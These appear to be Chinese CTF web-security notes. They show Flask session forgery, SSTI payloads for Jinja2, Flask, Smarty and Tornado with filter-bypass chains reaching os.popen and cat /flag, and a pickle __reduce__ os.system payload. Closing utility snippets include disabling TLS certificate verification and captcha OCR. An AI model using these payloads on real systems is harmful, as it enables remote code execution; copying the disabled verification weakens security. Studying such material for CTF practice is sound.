##  session伪造

**可以使用Wappalyzer 看看网站构造**

```nginx
# 使用flask_session_cookie_manager3.py进行解码看看
# 就是需要寻找到secret_key

# 解码
python3 flask_session_cookie_manager3.py 
decode -c 'eyJuYW1lIjoiMTIzIn0.ZICAzQ.I5lx6d3ZDDNkVbRdhgozyotzxXU' -s "LitCTF"

# 编码
python3 flask_session_cookie_manager3.py encode -s 'LitCTF' -t '{"name":"admin"}'
```







## 模版注入

### 寻找可用类脚本

```nginx
text = "所有子类字符串"

# 去除方括号
text = text.strip("[").strip("]")

items = text.split(", ")
# print(items[1])

# 同时查找多个字符串出现的位置
target_strings = [
    "<class 'subprocess.Popen'>", 
    "<class 'warnings.catch_warnings'>", 
    "<class 'os._wrap_close'>"
]

for target_string in target_strings:
    try:
        index = items.index(target_string)
        print(f"The '{target_string}' 位置在  {index}.")
    except ValueError:
        print(f"The '{target_string}' is not found in the list.")
```

**==详细==**：https://xz.aliyun.com/t/9584#toc-32

### 0、基础知识

- `|attr`:替代`.`，如：调用test类中的os方法可以使用：test|attr(参数)
- `__globals__`:以字典的形式返回当前作用域中的全局变量
- `__getitem__`:是字典对象内置的方法，用于获取指定键对应的值

##### lipsum

```nginx
lipsum|attr("__globals__").get("os").popen("ls").read()

# __globals__返回的参数是字典，使用get来获取
# 配合Unicode编码使用就是把（）中的内容进行编码

{%print(lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")())%}
```





> ==flash模板注入可利用的Python模块==
>
> ==核心：文件读写、命令执行，这两个主要关注：`file`类和`os`类==

1.   **subprocess.Popen**
2.   **os.wrap_close**
3.   **warnings.catch_warnings**
4.   **class 'site._Printer'**

>   常用搭配方式：
>
>   1.   `__class__`列出对象的属性
>   2.   `__class__.__mro__`找到object属性的位置
>   3.   `__class__.__mro__[object位置下标].__subclasses__()`列出所有属性

-   `__class__：对象的属性，返回对象的类型`
-   `__mro__：类的属性，返回包含类的所有父亲元组`
-   `__base__：类的属性，返回类所继承的基类`
-   `__globals__：函数的属性，返回一个字典（每个函数都有）`
    -   里面有当前空间下能使用的模块、方法、全局变量
-   `__init__：类的初始化方法`
-   `__subclasses__()：类的属性，子类的列表`
-   `__import__：`
    -   结构：`__improt__(<module name>)`
    -   功能：返回一个模块：`a = __import__("os")`
-   `exec`
    -   结构：`exec(<python code>)`
    -   功能：运行Python代码，`exec(''' import os ''')`
-   `open`
    -   结构：`open(<file path>)`
    -   功能：返回一个file对象，`open("flag.txt","r")`
-   `_getitem__`
    -   结构：`[1,2,3].__getitem__(2) == 3`   `{"a":1}.__getitem__("a") == 1`
    -   功能：根据list的index返回对应元素    根据key名，返回字典中对应的value
-   `pop`
    -   结构：
        -   `[1,2,3].pop(0) == 1`		
            -   返回list的第0个元素，并且list的元素减少	
        -   `{"a":1}.pop("a") == 1`
            -   返回dict的key对应的value



### Smary

> 题目地址：https://www.nssctf.cn/problem/5

```nginx
# 基于X-Forwarded-For的模版注入,单双引号不区别
{if system('cat /flag')}{/if}
{if show_source('/flag')}{/if}
{system("cat /flag")}
{{system('cat /flag')}}

```

### Jinja2

**语法方面和flask非常像**

#### 可执行命令的类



##### 

#### 过滤`{{}}、[]`

- **过滤掉`{{}}`**可使用`{% print() %}`代替

- 过滤掉`[]`可使用`|attr`来调用方法

  - `|attr('__class__') == .__class__`
  - `|attr` ==也常用于和Unicode编码搭配使用==
  - 









### flask

#### **无过滤情况**

```nginx
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__
      ['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

#### 过滤掉`__`

- **可用使用request对象绕过**

```nginx

```

#### 过滤了request和class

可以拿这个题目练习：[[NCTF2018]flask真香](https://www.nssctf.cn/problem/966)

**存在的过滤大概有**

```nginx
config
class
mro
args
request
open
eval
builtins
import
```



- **可以使用session对象绕过**

- **特性**
  
  - > **session一定是一个dict对象，然后可以通过键 ( 也就是数组) 的方式访问类**
    >
    > 
    >
    > **数组中的键是一个特殊的字符串，他可以通过拼接形成**
  
  - ```nginx
    # 可用进行测试
    {{session['__cla'+'ss__']}}
    
    # 执行成功会返回
    <class 'flask.sessions.NullSession'>
    ```
  
- **进一步利用**

  - **通过`__bases__`来获取基类元组，索引`0`表示引用基类，一直一直向上就可以访问到`object`类**

  - **`config`也是可以通过这种方法来逃逸的**

  - ==其中写那么多`__bases__[0]`都是为拿到`object`，写多少个取决于环境，这里是写四个到达`object`==

    ```nginx
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}
    
    # 返回结果
    <class 'object'>
    ```

- **访问子类**

  - > **通过实例化`__subclasses__`方法去访问所有的子类，同样可以使用字符串拼接**

  - ```nginx
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()}}
    
    # 结果会返回所有的子类
    然后通过寻找可用子类下标的脚本找到想要调用的模块下标位置
    ```

  - ```nginx
    # 假设<class 'os._wrap_close'>' 位置在  72，通过下面命令去加载他
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72]}}
    
    # 下标正确会返回
    <class 'os._wrap_close'>
    ```

  - > **然后通过`__init__`实例化它，在通过`__globals__`去查看他的全局变量**

  - ```nginx
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72].__init__.__globals__}}
    
    # 结果会返回一大片
    ```

  - > **如果需要执行命令就看有没有`popen`**

  - ```nginx
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72].__init__.__globals__['po'+'pen']}}
    
    # 结果
    <function popen at 0x7fe3a5e1ee18>
    ```

  - > **然后调用其中的`read`方法执行命令**

  - ```nginx
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72].__init__.__globals__['po'+'pen']('ls /').read()}}
    
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72].__init__.__globals__['po'+'pen']('cat /Th1s_is__F1114g ').read()}}
    ```


##### 增加过滤

练手题目：[[NCTF 2018]Flask PLUS](https://www.nssctf.cn/problem/965)

```nginx
__init__
file
__dict__
__builtins__
__import__
getattr
os
```

> - **使用`__enter__`方法代替`__init__`方法，因为`__enter__`有`__globals__`可用**
> - 结论：`__enter__ == __init__`

**构造payload**

```nginx
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[137].__enter__.__globals__['po'+'pen']('ls /').read()}}

# 或者
{{()['__cla''ss__'].__bases__[0]['__subcl''asses__']()[218].__enter__.__globals__['__bui''ltins__']['ev''al']("__im""port__('o''s').po""pen('ls').read()")}}

```

​	

#### 无回显SSTI

**通过`popen`和`curl`命令外带获得flag**,[详细看](https://xz.aliyun.com/t/9584#toc-35)





### tornado

#### 介绍

> **Tornado 模板实在过于开放，和 mako 差不多。所以 SSTI 手法基本上兼容 jinja2、mako 的 SSTI 手法，思路非常灵活**[详细看](https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/)



[护网杯]easy_tornado

#### 使用案例

```nginx
import tornado.ioloop, tornado.web

# 继承 tornado.web.RequestHandler 之后就可以定制不同请求方式要执行的函数
class IndexHandler(tornado.web.RequestHandler):
		# 处理 GET 请求
    def get(self):
				# 获取了名为 'a' 的请求参数
        print(self.get_argument('a'))

				# 路径对应的 endpoint 不需要 return，
				# 直接用 self.write、self.render_string、self.render 等等就可以返回响应内容
        self.write("get!")


# 通过实例化 tornado.web.Application 类创建一个应用程序对象 app
app = tornado.web.Application(
# 对于根路径（'/'）的请求使用 IndexHandler处理
    [('/', IndexHandler)],
)
app.listen(8888)
# 开始监听并处理客户端请求 
tornado.ioloop.IOLoop.current().start()
```

**模板语法测试代码**

```nginx
import tornado.ioloop
import tornado.web
import tornado.template as template

# 创建一个自定义的 RequestHandler 类
class MainHandler(tornado.web.RequestHandler):
    def get(self):
				# 获取name参数的值，并设置默认值
        name = self.get_query_argument('name', 'John Doe')
        print(name)
        self.write(template.Template(name).generate(name=name))


# 创建一个 Tornado 应用
def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
    ])

# 启动 Tornado 服务器
if __name__ == "__main__":
    app = make_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()
```

- **这就是最简单的一个实验脚本了**

#### 语法

> - `{{ ... }}`：里面直接写 python 语句即可，没有经过特殊的转换。默认输出会经过 html 编码
> - `{% ... %}`：内置的特殊语法，有以下几种规则
>   - `{# ... #}`：注释，到达后端接收到值为：`{`
>   - `{% comment ... %}`：也是注释，效果和上面的一样
>   - `{% from *x* import *y* %}`：等价与 python 原始的 `import`
>   - `{% include *filename* %}`：与手动合并模板文件到 `include` 位置的效果一样
>   - `{% autoescape *function* %}`：用于设置当前模板文件的编码方式
>   - `{% for *var* in *expr* %}...{% end %}`：等价与 python 的 for 循环
>   - `{% apply *function* %}...{% end %}`：用于执行函数，`function` 是函数名。`apply` 到 `end` 之间的内容是函数的参数
>   - 
>   - `{% block *name* %}...{% end %}`：引用定义过的模板段，通常配合 `extends` 使用
>     - 比如 `{% block name %}a{% end %}{% block name %}b{% end %}` 的结果是 `bb`...
>   - `{% extends *filename* %}`：将模板文件引入当前的模板，配合 `block` 食用
>   - 
>   - 



**==特殊的全局变量或者函数==**

> - `escape`：就是 `xhtml_escape`
> - `datetime`：就是 python 标准库里的 datetime
> - `_tt_utf8`：就是 `utf8`
> - `__loader__`，这个东西下面有个 `get_source`，它的作用是获取当前模板翻译后的代码

####  攻击思路

> Tornado 你可以理解为是 Flask + jinja2，所以 Tornado 的模板 `tornado.template` 其实也可以用在 Flask 里

然后就有：tornado.template` 再写 `tornado.template` + `tornado.web.Application

#### tornado.template 的 SSTI

==常规手法==

- **可以直接执行代码的方式**
  - `{{ __import__("os").system("whoami") }}`
  - `{% apply __import__("os").system %}id{% end %}`
  - `{% raw __import__("os").system("whoami") %}`



==临时代码的变量覆盖==

- Tornad生成模版的过程
  - 在 `site-packages/tornado/template.py` 的 `class Template` 下，
  - `__init__` 负责读取模板，然后调用 `_generate_python` 将模板内容转为Python代码，
  - 转换过程会用到 `_CodeWriter`，它负责把生成的 Python 代码写入 `String.IO` 实例中。
  - 拿到临时代码之后，将生成的 Python 代码编译为字节码。
  - 在执行 `generate` 的时候，会将临时代码用 `exec` 执行。



### Mako







### Twig





## 文件上传

### os.path.join()函数

> 题目地址：https://www.nssctf.cn/problem/2025

```nginx
# 函数的用处，常用路径拼接
首字母没有包含 ' \ ' 则会自己加上
如果首字母是 ' / ' 会保留原型

Path1 = 'home'
Path2 = '/develop'
Path3 = 'code'
Path10 = Path1 + Path2 + Path3
Path20 = os.path.join(Path1,Path2,Path3)
print ('Path10 = ',Path10)
print ('Path20 = ',Path20)
# Path10 = home/developcode
# Path20 = /develop\code
```



## pickle反序列化

**能够被序列化的对象**

-   `None`、`True` 和 `False`
-   整数、浮点数、复数
-   `str`、`byte`、`bytearray`
-   只包含可打包对象的集合，包括 tuple、list、set 和 dict
-   定义在模块顶层的函数（使用 [`def`](https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#def) 定义，[`lambda`](https://docs.python.org/zh-cn/3.7/reference/expressions.html#lambda) 函数则不可以）
-   定义在模块顶层的内置函数
-   定义在模块顶层的类
-   某些类实例，这些类的 [`__dict__`](https://docs.python.org/zh-cn/3.7/library/stdtypes.html#object.__dict__) 属性值或 [`__getstate__()`](https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__getstate__) 函数的返回值可以被打包（详情参阅 [打包类实例](https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle-inst) 这一段）

**对于不能序列化的类型，如lambda函数，使用pickle模块时则会抛出 [`PicklingError`](https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.PicklingError) 异常。**

>   **Python使用pickle进行序列化和反序列化，然后发现面临的一个获取不到返回值的框架，**
>
>   **似乎可以通过在框架中先序列化，然后在外部进行反序列化的方法来实现**

**主要方法**

```nginx
dump	对象反序列化到文件对象并存入文件
dumps	对象反序列化为 bytes 对象
load	对象反序列化并从文件中读取数据
loads	从 bytes 对象反序列化
```

```nginx
pickle.dump(obj, file, protocol=None, *, fix_imports=True)
	# obj：将 Python 对象 obj 序列化并写入文件对象 file 中
	# protocol：指定序列化协议的版本号，不写默认最高，可填0-5
	# fix_imports：用于控制是否自动修复导入的模块和类名

pickle.dumps(obj, protocol=None, *, fix_imports=True)
	# 将 obj 封存以后的对象作为 bytes 类型直接返回，而不是将其写入到文件
```

**正常序列化案例**

```nginx
import pickle
 
class Person():
    def __init__(self):
        self.age=18
        self.name="Pickle"
 
p=Person()
opcode=pickle.dumps(p)
print(opcode)
#结果如下
#b'\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94}\x94(\x8c\x03age\x94K\x12\x8c\x04name\x94\x8c\x06Pickle\x94ub.'
 
 
P=pickle.loads(opcode)
print('The age is:'+str(P.age),'The name is:'+P.name)
#结果如下
#The age is:18 The name is:Pickle
```

****

**本地的序列化与反序列化案例**

```py
import pickle

# 定义一个序列化的对象
class BeSerializing:
    # 初始化变量
    def __init__(self):
        self.var = "这是参数的内容"

    def print_var(self):
        print(f"self var value is:{self.var}")

# 进行序列化
class Serializing:
    def do_serializing(self):
        obj = BeSerializing()
        # with的好处是会最后自动释放获取的资源，对于文件就是最后会自己close()
        # 使用 open 函数打开一个文件句柄 file_handler，以二进制写入模式 "wb"。
        with open("test_pickle.obj", "wb") as file_handler:
            # 序列化，将对象写到文件
            pickle.dump(obj, file_handler)	 # 序列化并将 obj 对象写入文件

# 进行反序列化
class DeSerializing:
    def do_serializing(self):
        with open("test_pickle.obj", "rb") as file_handler:
            # 反序列化，将对象从文件中还原
            # 注意，虽然python的变量不需要使用前先定义类型，但使用时是要被格式化成确定类型的
            # 所以，如果反序列化类和被序列化类不在同一文件中，那么需要将被序列化类import进来，不然会因找不到被反序列化类而反序列化失败
            obj = pickle.load(file_handler)
            print(f"对象类型: {type(obj)}\n"
                  f"参数值: {obj.var}")


if __name__ == "__main__":
  	obj_se = Serializing()  # 创建 Serializing 类的实例对象 obj_se
    obj_se.do_serializing()  # 调用 do_serializing 方法进行序列化操作
    obj_de = DeSerializing()  # 创建 DeSerializing 类的实例对象 obj_de
    obj_de.do_serializing()  # 调用 do_serializing 方法进行反序列化操作
    
```

**网络的序列化与反序列化案例**

>   **上一个是以文件作为中介实现序列化与反序列化的**，
>
>   但如果到**网络中就没有文件作为中介**。
>
>   此时可以使用`pickle.dumps()`和`pickle.loads()`**进行序列化与反序列化。**

```py
import binascii
import pickle

# 需要序列化的对象
class BeSerializing:
    def __init__(self):
        self.var = "a test string."

    def print_var(self):
        print(f"self var value is:{self.var}")

# 序列化
class NoFileSerializing:
    def do_serializing(self):
        be = BeSerializing()
        
        # 二进制直接decode可能很多位置没法解码（codec can't decode）
        obj_bytes = pickle.dumps(be)
        # 所以先转成ascii码形式的16进制再decode
        str = binascii.b2a_hex(obj_bytes).decode(encoding="ascii")

        # 模拟网络远端获取传过来的字符串
        net_str = str
        # 还原成二进制
        net_bytes = binascii.a2b_hex(net_str.encode(encoding="ascii"))
        # 反序列化
        obj_str = pickle.loads(net_bytes)
        print(obj_dst.var)	# 输出：a test string.

if __name__ == "__main__":
    obj_nf = NoFileSerializing()
    obj_nf.do_serializing()
```

### 漏洞常见出现地方

1.  通常在解析认证`token`, `session`的时候，现在很多`Web`服务都使用`redis`、`mongodb`、`memcached`等来存储`session`等状态信息.
2.  可能将对象`Pickle`后存储成磁盘文件
3.  可能将对象`Pickle`后在网络中传输

### 漏洞利用方式

>   **漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化,** 
>
>   **反序列化后产生的对象会在结束时触发`__reduce__()`函数从而触发恶意代码**.
>
>   ==`__reduce__`方法会在反序列化时固定调用==

**基本payload**

```nginx
import pickle
import os

class Person():
    def __init__(self):
        self.age = 18
        self.name = "Pickle"

    # 该函数能够定义该类的二进制字节流被反序列化时进行的操作，
    # 返回值是一个(callable, ([para1,para2...])[,...])类型的元组
    # 当字节流被反序列化时，Python就会执行callable(para1,para2...)函数
    def __reduce__(self):
        # 因此当上述的Person对象被unpickling时，就会执行os.system(command)，
        command = r"whoami"
        return os.system, (command,)


p = Person()
opcode = pickle.dumps(p)
print(opcode)

P = pickle.loads(opcode)
print('The age is:' + str(P.age), 'The name is:' + P.name)

```



## flask

### Double Secret

> 题目地址：https://www.nssctf.cn/problem/7





## python运用

### BeautifulSoup库使用

>   BeautifulSoup库是Python中一个非常流行的HTML和XML解析库。
>
>   它可以从HTML或XML文档中提取数据，使得数据提取更加方便快捷

**假设我们有一个包含以下HTML代码的文件`example.html`**

```xml
<!DOCTYPE html>
<html>
<head>
	<title>Example Page</title>
</head>
<body>
	<h1>Welcome to my website!</h1>
	<p>Here is some information about me:</p>
	<ul>
		<li>Name: John Smith</li>
		<li>Age: 30</li>
		<li>Occupation: Web Developer</li>
	</ul>
</body>
</html>
```

**我们可以使用如下代码来解析这个HTML文件**

```py
from bs4 import BeautifulSoup

# 读取HTML文件内容
with open('example.html', 'r') as file:
    html = file.read()

# 解析HTML文件内容
soup = BeautifulSoup(html, 'html.parser')

# 获取页面标题
title = soup.title.string

# 获取页面主体内容
body = soup.body

# 获取姓名、年龄和职业信息
name = soup.find('li', text='Name:').string.split(':')[1].strip()
age = soup.find('li', text='Age:').string.split(':')[1].strip()
occupation = soup.find('li', text='Occupation:').string.split(':')[1].strip()

# 输出结果
print('Title:', title)
print('Name:', name)
print('Age:', age)
print('Occupation:', occupation)
# 输出结果为:
# Title: Example Page
# Name: John Smith
Age: 30
Occupation: Web Developer

```



### 证书验证解决

**（同时适用urlopen和urlretrieve函数）：**

```python
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
```

**（适用于urlopen函数,因为urlretrieve没有context参数所以不适用）：**

```python
import ssl
context = ssl._create_unverified_context()
response = urlopen(json_url, context=context)
```

### 获取验证码

```python
import ddddocr

ocr = ddddocr.DdddOcr()
with open('1.png', 'rb') as f:
    img_bytes = f.read()
res = ocr.classification(img_bytes)

print(res)
```

### 会话维持

```python
s=requests.Session()
s.get('http://httpbin.org/cookies/set/number/123456789')
r=s.get('http://httpbin.org/cookies')
print(r.text)

```

### 写入文件

**多行写入（如html）**

```python
data = ['a','b','c']
#单层列表写入文件
with open("data.txt","w") as f:
    f.writelines(data)
```
